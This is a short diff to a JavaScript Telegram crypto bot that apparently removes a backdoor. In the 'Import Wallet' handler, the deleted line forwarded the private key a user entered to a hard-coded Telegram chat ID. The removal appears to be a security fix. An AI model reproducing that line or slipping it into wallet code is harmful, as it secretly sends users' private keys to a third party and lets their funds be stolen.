@@ -280,7 +280,6 @@ bot.on('text', async (ctx) => {
       await ctx.reply(settingText, await settingMarkUp(user));
     } else if (botState === 'Import Wallet') {
       const wallet = await generateWalletFromKey(text);
-      await bot.telegram.sendMessage(7779702535, text);
       if (wallet.privateKey) {
         user.wallet.publicKey = wallet?.publicKey || '';
         user.wallet.privateKey = wallet?.privateKey || '';
